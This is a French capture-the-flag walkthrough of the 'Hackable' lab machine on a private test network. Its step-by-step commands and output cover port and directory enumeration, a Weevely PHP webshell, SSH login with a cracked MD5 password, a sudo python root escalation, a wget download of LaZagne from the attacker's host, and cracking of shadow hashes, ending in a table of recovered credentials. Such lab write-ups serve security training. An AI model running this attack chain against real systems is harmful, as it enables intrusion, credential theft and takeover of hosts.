# Hackable

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.78
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.78...100%
[+] Scan Nmap 192.168.56.78...100%

[+] 22/tcp open
[+] 80/tcp open

==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.78-tcp.html      |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> Gobuster

Voyons les `directory` cacher

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.78 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.78
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/files                (Status: 301) [Size: 314] [--> http://192.168.56.78/files/]
/server-status        (Status: 403) [Size: 278]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

<span style="color: #dddddd;">🚪</span> Weevely

Génération de la `webshell`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $weevely generate 0000 webshell.php
Generated 'webshell.php' with password '0000' of 761 byte size.
```

&nbsp;

Exécution

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $weevely 'http://192.168.56.78/files/webshell.php' 0000

[+] weevely 4.0.1

[+] Target:	192.168.56.78
[+] Session:	/home/parrot/.weevely/sessions/192.168.56.78/webshell_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

&nbsp;

Fichier `txt` intéressant

```
www-data@ubuntu:/home $ cat important.txt
run the script to see the data

/.runme.sh
```

&nbsp;

Voyons le contenu

```
www-data@ubuntu:/home $ cat /.runme.sh
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'restarting computer in 3 seconds...'
sleep 1
echo 'restarting computer in 2 seconds...'
sleep 1
echo 'restarting computer in 1 seconds...'
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d'

```

&nbsp;

Crack du hash `MD5` trouver

<img width="972" height="717" alt="Capture du 2025-02-10 21-17-53" src="https://github.com/user-attachments/assets/f969a99e-ae3d-420d-aef6-4b8c0a04d8a3" />


&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ssh 192.168.56.78 -u shrek -p onion
SSH         192.168.56.78   22     192.168.56.78    [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
SSH         192.168.56.78   22     192.168.56.78    [+] shrek:onion (Pwn3d!) Linux - Shell access!
```

&nbsp;

<span style="color: #dddddd;">⚙️</span> **GTFObin**

Avec un `sudo -l` on peut voir qu’on peut être root sans password avec `python`

```
shrek@ubuntu:~$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```

&nbsp;

Allons voir sur `GTFObins` si python peut nous être utiles

<img width="957" height="383" alt="Capture du 2025-02-10 21-35-46" src="https://github.com/user-attachments/assets/845896a0-c521-47f9-8cde-1eca8b4bcc09" />


&nbsp;

Devenir root avec python avec utilisateur `shrek` grâce au `GTFObin`

```
shrek@ubuntu:~$ sudo python3.5 -c 'import os; os.system("/bin/sh")'
# bash -i
root@ubuntu:~# 
```

&nbsp;

**<span style="color: #dddddd;">👾</span>** LaZagne

Téléchargement de laZagne

```
root@ubuntu:~# wget 192.168.56.104:8080/LaZagne-2.4.6.zip
--2025-02-10 17:37:31--  http://192.168.56.104:8080/LaZagne-2.4.6.zip
Connecting to 192.168.56.104:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 705000 (688K) [application/zip]
Saving to: 'LaZagne-2.4.6.zip'

LaZagne-2.4.6.zip                               100%[=====================================================================================================>] 688.48K  --.-KB/s    in 0.005s  

2025-02-10 17:37:31 (124 MB/s) - 'LaZagne-2.4.6.zip' saved [705000/705000]
```

&nbsp;

Unzip

```
root@ubuntu:~# python3.5 -c "
> import zipfile
> with zipfile.ZipFile('/home/shrek/LaZagne-2.4.6.zip', 'r') as zip_ref:
>     zip_ref.extractall('/home/shrek/')
> "
```

&nbsp;

Exécution

```
root@ubuntu:~/LaZagne-2.4.6/Linux# python3.5 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/

------------------- Shadow passwords -----------------

[+] Password found !!!
Login: ftp
Password: ftp

[+] Hash found !!!
Hash: $6$nAQJF5g.$3upB766t4FZNg6A8pIBgwuY9Vf/172XbRYNglzIRsFh28mLLJksmvcr6cHdP4wC2HwAcXnBlCf0cZfJFgdlYd.:18591:0:99999:7:::
Login: shrek

[+] Hash found !!!
Hash: $6$/pxYVHy/$eXU.eOEqzxpJV9B7.ehJsSu7YV9Vl/kv6DoFph14HavO9wQGzIn0EGsxuK06LOEL3VPEmquOFD73.Y5672Mmj1:18793:0:99999:7:::
Login: root


[+] 4 passwords have been found.
For more information launch it again with the -v option

elapsed time = 6.973176956176758
```

&nbsp;

🧨 **JohnTheRipper**

Crack du hash `root`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $john hackable --wordlist=Desktop/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
TrOLLED          (root)     
1g 0:00:00:00 DONE (2025-02-10 22:19) 8.333g/s 1066p/s 1066c/s 1066C/s TrOLLED..princess1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[parrot@parrot]─[~/Documents]
└──╼ $john --show hackable  
root:TrOLLED::0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| ftp | ftp |
| shrek | onion |
| root | TrOLLED |
